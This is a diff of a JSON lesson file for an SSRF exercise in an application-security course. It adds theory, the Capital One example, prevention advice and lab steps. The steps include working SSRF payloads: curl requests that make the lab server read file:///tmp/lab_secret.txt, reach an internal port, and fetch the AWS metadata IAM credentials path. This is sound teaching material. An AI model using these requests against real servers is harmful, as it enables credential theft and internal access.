@@ -4,9 +4,9 @@
   "title": "SSRF",
   "track": "OWASP Top 10",
   "difficulty": "core",
-  "estimate": "20 min",
+  "estimate": "25 min",
   "brief": "**Ticket:** a 'fetch URL' feature does not check where it points. Reach the cloud metadata service and capture the role credential it exposes.",
-  "theory": "## SSRF (OWASP A10)\nThe server fetches a URL you choose. With no validation you reach internal services and the cloud metadata IP `169.254.169.254` (a **link-local** address) to steal credentials.\n\n**Fix:** allowlist http/https, resolve the host, reject private/loopback/link-local ranges.",
+  "theory": "## What it is\nServer-Side Request Forgery (SSRF) is making the *server* send a request of your\nchoosing. The app takes a URL from you and fetches it, so you aim it at internal\nsystems the server can reach but you cannot.\n\n## How it works\nAn endpoint like `/fetch?url=...` is meant for public URLs. Point it at\n`file:///etc/passwd`, `http://127.0.0.1:admin-port/`, or the cloud metadata\naddress `http://169.254.169.254/` and the server fetches internal resources and\nhands you the response.\n\n## In the real world\nThe **Capital One breach (2019)** was SSRF: the attacker made a server request the\nAWS metadata endpoint, stole its temporary IAM credentials, and exfiltrated data\non ~100 million people. SSRF is now **OWASP A10** precisely because cloud\nmetadata makes it so damaging.\n\n## How to prevent it\n**Allow-list** the destinations the server may fetch (scheme + host), block\ninternal/link-local ranges and `file://`, and resolve-then-validate the hostname\nto stop DNS-rebinding. In the cloud, require IMDSv2 so metadata is not trivially\nreadable.",
   "worked_example": "```\n$ curl \"https://x/fetch?url=http://169.254.169.254/latest/meta-data/iam/...\"\n{\"AccessKeyId\":\"ASIA...\"}   # instance creds leaked\n```",
   "knowledge_check": [
     {
@@ -33,16 +33,19 @@
     }
   ],
   "investigation": {
-    "intro": "Make the server fetch the internal metadata path.",
+    "intro": "Make the server read a local file and reach an internal port it was never meant to expose.",
     "steps": [
-      "```bash\ncd /workspaces/examto/ctf-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate 2>/dev/null; pip install -q -r requirements.txt\npython3 target/run_target.py        # leave this running\n```",
-      "In a second terminal, point the fetch at the metadata service:\n```bash\ncurl -s \"http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role\"\n```",
-      "The response body is the flag."
+      "**Start the lab app** (leave it running; open a *second* terminal tab for the attack):\n```bash\ncd /workspaces/examto/appsec-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate; pip install -q -r requirements.txt\npython3 run_server.py\n```",
+      "In a second terminal, drop a 'secret' file on the box and make the server read it via `file://` - input you control becomes a server-side file read:\n```bash\necho \"INTERNAL-ONLY-SECRET\" > /tmp/lab_secret.txt\ncurl -s \"http://127.0.0.1:5000/fetch?url=file:///tmp/lab_secret.txt\"\n```",
+      "Now aim it at an internal service the server can reach:\n```bash\ncurl -s \"http://127.0.0.1:5000/fetch?url=http://127.0.0.1:80/\"\n```",
+      "**Apply the fix and re-test.** Stop the server (Ctrl+C) and restart it in secure mode, then run the SAME attack again:\n```bash\nLAB_SECURE=1 python3 run_server.py\n```\nRe-run both: secure mode allow-lists destinations and rejects `file://` and internal addresses.",
+      "Capture the flag on the CTF target's SSRF challenge. Start it, then make the server fetch the simulated cloud-metadata URL:\n```bash\ncd /workspaces/examto/ctf-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate; pip install -q -r requirements.txt\npython3 target/run_target.py        # leave running\n```",
+      "In a second terminal, point `/fetch` at the internal metadata endpoint - the server reaches it for you and returns the `FLAG{...}`:\n```bash\ncurl -s \"http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role\"\n```"
     ],
     "hints": [
-      "The classic internal target is the link-local metadata IP.",
-      "169.254.169.254 serves instance metadata.",
-      "Fetch the /latest/meta-data/iam/security-credentials/role path."
+      "Try the file:// scheme to read a local file.",
+      "The dangerous cloud target is 169.254.169.254 (metadata).",
+      "The capture describes what the SSRF reached."
     ]
   },
   "capture": {
